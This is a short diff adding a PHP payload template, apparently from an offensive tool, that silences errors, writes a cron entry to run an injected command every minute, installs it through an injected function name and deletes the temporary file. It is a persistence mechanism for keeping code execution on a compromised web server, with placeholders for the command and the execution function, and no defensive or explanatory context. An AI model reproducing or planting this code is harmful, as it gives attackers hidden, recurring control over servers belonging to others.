@@ -1,0 +1,7 @@
+<?php
+    @set_time_limit(0);
+    @error_reporting(0);
+    file_put_contents('/tmp/.cron','* * * * * '."%(cmd)s");
+    %(func)s('crontab /tmp/.cron');
+    unlink('/tmp/.cron');
+?>
